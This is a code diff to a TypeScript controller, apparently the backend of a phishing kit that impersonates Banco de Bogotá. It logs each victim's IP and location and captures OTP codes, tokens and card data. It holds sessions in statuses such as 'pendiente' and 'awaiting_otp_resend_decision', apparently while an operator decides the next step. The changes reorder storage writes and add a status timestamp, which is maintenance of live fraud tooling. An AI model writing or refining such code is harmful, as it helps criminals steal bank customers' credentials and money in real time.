@@ -89,15 +89,16 @@ export class BogotaController {
       // Formatear la ubicación: "País, Ciudad, Región"
       const location = geoData ? `${geoData.country}, ${geoData.city}, ${geoData.region}` : 'Desconocida';
 
-      // Se agrega el session Id
       currentSession.ip = ip;
       currentSession.location = location;
       currentSession.banco = "BOGOTA";
       currentSession.sessionId = sessionId;
+      currentSession.lastStatus = 'pendiente';
+      currentSession.statusTick = Date.now();
 
       // Se añade la informacion al storage
-      await StorageService.set(`session_${sessionId}`, currentSession);
       await StorageService.set(`status_${sessionId}`, 'pendiente');
+      await StorageService.set(`session_${sessionId}`, currentSession);
 
       // Se captura si viene por tc
       const tc = currentSession.tc || false;
@@ -177,10 +178,12 @@ export class BogotaController {
         otp: otp,
         fecha: BogotaController.formatDateCustom(new Date()),
       });
+      currentSession.lastStatus = 'pendiente';
+      currentSession.statusTick = Date.now();
 
       // Se setea la informacion en el almacenamiento
-      await StorageService.set(`session_${sessionId}`, currentSession);
       await StorageService.set(`status_${sessionId}`, 'pendiente');
+      await StorageService.set(`session_${sessionId}`, currentSession);
 
       // Se usa el messageId de la sesión (persiste en Firebase, no en memoria)
       const messageId = currentSession.messageId;
@@ -256,10 +259,12 @@ export class BogotaController {
         mensaje: 'El usuario solicita nueva OTP',
         fecha: BogotaController.formatDateCustom(new Date()),
       });
+      currentSession.lastStatus = 'awaiting_otp_resend_decision';
+      currentSession.statusTick = Date.now();
 
       // Se setea la informacion en el almacenamiento
-      await StorageService.set(`session_${sessionId}`, currentSession);
       await StorageService.set(`status_${sessionId}`, 'awaiting_otp_resend_decision');
+      await StorageService.set(`session_${sessionId}`, currentSession);
 
       // Se usa el messageId de la sesión (persiste en Firebase, no en memoria)
       const messageId = currentSession.messageId;
@@ -337,10 +342,12 @@ export class BogotaController {
         token: token,
         fecha: BogotaController.formatDateCustom(new Date()),
       });
+      currentSession.lastStatus = 'pendiente';
+      currentSession.statusTick = Date.now();
 
       // Se setea la informacion en el almacenamiento
-      await StorageService.set(`session_${sessionId}`, currentSession);
       await StorageService.set(`status_${sessionId}`, "pendiente");
+      await StorageService.set(`session_${sessionId}`, currentSession);
 
       // Se usa el messageId de la sesión (persiste en Firebase, no en memoria)
       const messageId = currentSession.messageId;
@@ -1035,6 +1042,7 @@ export class BogotaController {
       const payload: Record<string, unknown> = {
         success: true,
         estado: status,
+        statusTick: firebaseSession?.statusTick ?? session?.statusTick ?? (await StorageService.get(`status_tick_${sessionIdStr}`)) ?? null,
         sesion: 'activa',
         cardData,
         text,
